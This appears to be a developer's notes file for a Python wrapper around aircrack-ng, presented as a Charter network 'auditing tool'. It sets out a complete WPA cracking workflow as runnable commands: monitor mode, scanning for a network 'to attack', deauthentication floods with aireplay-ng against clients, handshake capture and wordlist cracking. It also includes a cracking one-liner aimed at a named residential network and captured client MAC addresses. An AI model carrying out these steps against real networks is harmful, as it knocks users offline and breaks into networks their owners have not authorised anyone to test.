!MUST RUN AS ROOT!	

adj | aircrack-ng -w - ../CAT/captures/capture_7C\:DB\:98\:B4\:5D\:59_MySpectrumWiFi5B-2G-01.cap -e MySpectrumWiFi5B-2G



Airmon-ng --write DOES NOT PROVIDE ALL DETAILS THAT ARE SEEN IN THE TERMINAL	
THEREFORE I AM USING WASH AS A WAY TO GATHER NETWORK INFORMATION	

Python System Calls:	
import subprocess	

PYTHON 2.7	
subprocess.call(['command','option'])	
ex: subprocess.call(['ls','-l'])	

PYTHON 3	
subprocess.run('command') or subprocess.run(['command','option'])	

SUBPROCESS NOTES:	
* Capture STD_OUT from subprocess.run('~', cature_output.True)	
>>> proc = subprocess.Popen('ls', stdout=subprocess.PIPE)	
>>> output = proc.stdout.read()	
>>> print output	
bar	
baz	
foo	
----------------	
Better use of subprocess:	
* Capture output of run(), save to variable, then run checks	
proccess1 = subprocess.run(['ls','-lsa'], capture_output=True, text=True)	
print(proccess1.stdout)	

Aircrack-ng Process:	
0. ROOT USER - MUST RUN SCRIPT AS ROOT	
1. airmon-ng check kill - KILLS INTERFERING PROCESSES	
2. airmon-ng start wlan0 - SETS WIRELESS CARD TO MONITOR MODE	
3. airodump-ng wlan0mon - SCANS FOR NEARBY NETWORKS	
4. FIND NETWORK TO ATTACK	
5a. airodump-ng --bssid 00:01:02:03:04:05 -w FILENAME wlan0mon	
5b. aireplay-ng --deauth 100 -a 00:01:02:03:04:05 -c 00:01:02:03:04:05 wlan0mon	
5c. PERFORM 5a AND 5b AT SAME TIME	
6. CAPTURE HANDSHAKE BETWEEN DEVICE AND TARGET NETWORK	
7. aircrack-ng -w WORDLIST FILENAME.cap	

Airodump-ng Notes:	
sudo airodump-ng -R '(TCC.)' -w test --output-format csv wlan0mon	
sudo airodump-ng -R '(MyCharterWiFi)' -w myOutput --output-format csv wlan0mon	
ROOT airodump-ng -R '[REGEX]' -w [OUTPUTFILE] --output-format [FILETYPE] [INTERFACE]	

WORKS:sudo airodump-ng -R '(My.)' -w targetstest --output-format csv wlan0mon	


Other:	
New Kali 2020.1 - not root as default	
		- users must run script as root	

Handshake Notes:	
** How to successfully get a GOOD handshake from network **	
Use Airodump-ng to listen to the network: sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w [FILENAME] --output-format cap [INTERFACE]	
Use Python to gather clients: listed under STATION
Run aireplay-ng command on each client
Check with Pyrit


VERIFY HANDSHAKE:	
Pyrit	

1.) In CMD type the following command	
CODE:	
pyrit -r FONHandShake.cap analyze	
REPLACE FONHandShake.cap WITH THE NAME OF YOUR .CAP FILE WHICH SHOULD BE IN THE HOME DIRECTORY.	

You will get the results which will state if the handshake is good or not(good/workable/bad).	
If you have a good quality handshake it should have the word "Good" in there.	

FIND CLIENTS:	
CH 10 ][ Elapsed: 36 s ][ 2020-03-12 18:36 ][ WPA handshake: A0:63:91:E3:41:C9                         	

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID	

 A0:63:91:E3:41:C9  -55  97      324      410    0  10  405  WPA2 CCMP   PSK  MyCharterWiFic9-2G        <--- NETWORK	

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                              	

 A0:63:91:E3:41:C9  02:0F:B5:05:41:27  -84    0 - 1e     0       13       <--- CLIENT                               	
 A0:63:91:E3:41:C9  02:0F:B5:1C:8A:04  -85    0 - 1e     0       13       <--- CLIENT                               	
 A0:63:91:E3:41:C9  02:0F:B5:6B:0D:19  -83    0 - 1e     0       11       <--- CLIENT                               	
 A0:63:91:E3:41:C9  02:0F:B5:FB:E2:BA  -84    1e- 1e     0      676       <--- CLIENT                               	
 A0:63:91:E3:41:C9  02:0F:B5:5F:6B:66  -83    0 - 1e     0       11       <--- CLIENT	

TODO:

* Find clients -- DONE	
* Verify handshakes -- In Progress	
* Add directory check and initialization -- Planned	



Welcome Messages:

print('          ▀▀▀██████▄▄▄          ')	
print('                 ▀▀▀████▄       ')	
print('          ▄███████▀   ▀███▄     ')	
print('        ▄███████▀       ▀███▄   ')	
print('      ▄████████           ███▄  ')	
print('     ██████████▄           ███▌   ██████╗ ██╗   ██╗██████╗     ███████╗██████╗ ███████╗ ██████╗████████╗██████╗ ██╗   ██╗███╗   ███╗    ██╗    ██╗██╗███████╗██╗')	
print('     ▀█████▀ ▀███▄         ▐███  ██╔═══██╗██║   ██║██╔══██╗    ██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗ ████║    ██║    ██║██║██╔════╝██║')	
print('       ▀█▀     ▀███▄       ▐███  ██║   ██║██║   ██║██████╔╝    ███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝██║   ██║██╔████╔██║    ██║ █╗ ██║██║█████╗  ██║')	
print('                 ▀███▄     ███▌  ██║   ██║██║   ██║██╔══██╗    ╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██║   ██║██║╚██╔╝██║    ██║███╗██║██║██╔══╝  ██║')	
print('    ▄██▄           ▀███▄  ▐███   ╚██████╔╝╚██████╔╝██║  ██║    ███████║██║     ███████╗╚██████╗   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║    ╚███╔███╔╝██║██║     ██║')	
print('  ▄██████▄           ▀███▄███     ╚═════╝  ╚═════╝ ╚═╝  ╚═╝    ╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝')	
print(' █████▀▀████▄▄        ▄█████    ')	
print(' ████▀   ▀▀█████▄▄▄▄█████████▄  ')	
print('  ▀▀         ▀▀██████▀▀   ▀▀██  ')  	


	░░░░░░░░░░▀▀▀██████▄▄▄░░░░░░░░░░ 	
	░░░░░░░░░░░░░░░░░▀▀▀████▄░░░░░░░ 	
	░░░░░░░░░░▄███████▀░░░▀███▄░░░░░ 	
	░░░░░░░░▄███████▀░░░░░░░▀███▄░░░ 	
	░░░░░░▄████████░░░░░░░░░░░███▄░░ 	
	░░░░░██████████▄░░░░░░░░░░░███▌░ 	
	░░░░░▀█████▀░▀███▄░░░░░░░░░▐███░ 	
	░░░░░░░▀█▀░░░░░▀███▄░░░░░░░▐███░ 	
	░░░░░░░░░░░░░░░░░▀███▄░░░░░███▌░ 	
	░░░░▄██▄░░░░░░░░░░░▀███▄░░▐███░░ 	
	░░▄██████▄░░░░░░░░░░░▀███▄███░░░ 	
	░█████▀▀████▄▄░░░░░░░░▄█████░░░░ 	
	░████▀░░░▀▀█████▄▄▄▄█████████▄░░ 	
	░░▀▀░░░░░░░░░▀▀██████▀▀░░░▀▀██░░	

    print(Fore.BLUE)	
    print(' ,--------------------------.')	
    print('( Change Your WiFi Password! )   .-.')	
    print(' `--------------------------\'     \ \\')	
    print('       (_)                         \ \\')	
    print('           O                       | |')	
    print('             o                     | |    ██████╗        █████╗        ████████╗')	
    print('               . /\---/\   _,---._ | |   ██╔════╝       ██╔══██╗       ╚══██╔══╝')	
    print("                /^   ^  \,'       \'. ;   ██║            ███████║          ██║   ")	
    print('               ( O   O   )           ;   ██║            ██╔══██║          ██║   ')	
    print("                `.=o=__,'            \\   ╚██████╗██╗    ██║  ██║██╗       ██║██╗")	
    print('                  /         _,--.__   \\   ╚═════╝╚═╝    ╚═╝  ╚═╝╚═╝       ╚═╝╚═╝')	
    print("                 /  _ )   ,'   `-. `-. \\     Charter(networks) Auditing Tool")	
    print("                / ,' /  ,\'        \ \ \ \             by Edward Ayala")	
    print("               / /  / ,'          (,_)(,_)")	
    print('              (,;  (,,)')                                                                             	
    print(Style.RESET_ALL)